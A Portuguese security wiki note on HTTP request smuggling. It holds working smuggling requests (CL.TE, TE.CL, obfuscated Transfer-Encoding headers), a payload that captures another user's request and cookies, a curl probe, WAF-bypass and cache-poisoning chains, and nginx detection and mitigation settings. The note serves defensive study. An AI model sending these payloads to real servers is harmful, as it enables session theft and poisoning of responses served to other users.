# HTTP Request Smuggling

**Tags:** #alto #critico #request-smuggling #proxy #dessinc
**OWASP:** A05:2021  Security Misconfiguration
**CVSS Base:** 8.1 (Alto)  9.8 (Crítico  cache poisoning para todos)

---

## 📖 O que é

HTTP Request Smuggling é uma dessincronização de infraestrutura. Acontece quando um **Reverse Proxy** (NGINX, Cloudflare, HAProxy) e um **App Server** (Node.js, Tomcat, Gunicorn) discordam sobre onde uma requisição termina e outra começa  usando os headers `Content-Length` (CL) e `Transfer-Encoding: chunked` (TE).

O atacante empilha uma requisição envenenada no final da primeira; a "sobra" é atribuída à próxima requisição de um usuário aleatório.

---

## 🔍 `grep_search` Táticas

```
# Configurações de proxy
nginx.conf
haproxy.cfg
traefik.yml
httpd.conf
upstream
proxy_pass
listen
keep-alive
transfer-encoding
content-length
chunked
```

**O que buscar:** Reverse Proxies configurados com **keep-alive** que repassam requisições sem canonização dos headers `Content-Length` e `Transfer-Encoding`.

---

## 💣 Tipos de Request Smuggling

### CL.TE (Front usa Content-Length, Back usa Transfer-Encoding)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**O que acontece:**
1. **Front-end (usa CL=13):** processa os 13 bytes até "0\r\n\r\n"  encaminha tudo
2. **Back-end (usa TE):** interpreta "0\r\n\r\n" como fim de chunked  a parte "SMUGGLED" fica no buffer
3. A próxima requisição do próximo usuário lê "SMUGGLED" como parte de seu request

---

### TE.CL (Front usa Transfer-Encoding, Back usa Content-Length)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

12
SMUGGLED_PAYLOAD

0
```

---

### TE.TE (Ambos processam TE, mas um pode ser ofuscado)

```http
POST / HTTP/1.1
Transfer-Encoding: chunked
Transfer-Encoding: identity     header duplicado  um dos servidores ignora o primeiro
```

```http
# Ofuscações do header Transfer-Encoding
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: CHUNKED
X: X[\n]Transfer-Encoding: chunked
```

---

## 💣 Impactos por Técnica

### 1. Captura de Requisição de Outro Usuário

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 118
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```

 A próxima requisição de um usuário aleatório é capturada como parte do body de `/search`  
 Se `/search` reflete o body, o atacante lê os headers/cookies da requisição capturada

### 2. Bypass de WAF / ACL via Smuggling

```
WAF inspeciona o que o front-end "vê"  uma requisição aparentemente para /home
Mas o back-end "vê"  uma requisição para /admin (contrabandeada)

Front: POST /home  legítimo
Back:  POST /admin  contrabandeado  sem verificação do WAF
```

### 3. Cache Poisoning Universal

```
Contrabandear uma segunda requisição que, ao ser processada pela URL /home, 
injeta uma resposta maliciosa que é cacheada pelo CDN  servida para todos.
```

---

## 🔍 Detecção Estática

Verificar nos arquivos de configuração:

```nginx
# nginx.conf  configuração vulnerável
upstream backend {
    server app:8080;
    keepalive 100;  # keep-alive habilitado
}

server {
    location / {
        proxy_pass http://backend;
        proxy_http_version 1.1;
        proxy_set_header Connection "";  # sem upgrade de conexão
        #  sem normalização de CL/TE  possível smuggling
    }
}
```

**Mitigação nginx:**
```nginx
#  CORRETO  normalizar headers no proxy
proxy_http_version 1.1;
proxy_set_header Transfer-Encoding "";   # remover TE antes de repassar
proxy_set_header Connection "keep-alive";
```

---

## 🧪 Ferramentas de Detecção

```bash
# Burp Suite  HTTP Request Smuggler Extension (James Kettle)
# Detecta automaticamente CL.TE, TE.CL, TE.TE

# Manualmente via curl (CL.TE básico):
curl -s -o /dev/null -w "%{http_code}" \
  --http1.1 \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 6" \
  --data $'3\r\nabc\r\n0\r\n\r\n' \
  "http://target.com/"
```

---

## 🛡️ Correção

```nginx
#  NGINX  rejeitar requisições ambíguas
# Normalizar CL e TE no front-end antes de repassar
proxy_set_header Transfer-Encoding "";

# Configurar para usar HTTP/2 entre front e back (sem esse problema)
# HTTP/2 usa frames, não headers CL/TE
```

```
Correções arquiteturais:
1. Usar HTTP/2 end-to-end (elimina o problema por design)
2. Usar o mesmo servidor para front e back (sem proxy intermediário)
3. Desabilitar keep-alive entre front-end e back-end
4. Normalizar headers TE/CL no front-end antes de repassar
5. Atualizar para versões do proxy que sanitizam automaticamente
```

---

## 🔗 Chain Exploits

```
Request Smuggling + WAF bypass  Acessar endpoints administrativos protegidos
Request Smuggling + Cache Poisoning  XSS para todos os usuários via CDN envenenado
Request Smuggling  Captura de sessões de outros usuários  Account Takeover
Request Smuggling + Host header injection  Poison de respostas
TE.TE via header ofuscado + firewall cego  Bypass de ACL de IP
```

---

## 📌 Referências
- [[http-security-headers]]
- [[iac-security-docker-kubernetes-terraform]]
- [PortSwigger HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [James Kettle Research](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
